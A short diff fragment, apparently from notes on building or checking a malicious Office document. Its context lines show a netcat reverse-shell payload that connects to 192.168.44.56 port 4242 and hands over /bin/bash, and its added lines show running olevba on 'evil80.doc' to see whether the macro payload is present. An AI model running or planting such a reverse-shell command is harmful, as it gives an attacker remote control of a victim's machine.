@@ -108,3 +108,7 @@ Netcat payload for executing reverse shell on linux:
 
 nc -n 192.168.44.56 4242 -e /bin/bash
 
+Using olevba to see if the payload is present in the file or not:
+
+olevba -c evil80.doc
+
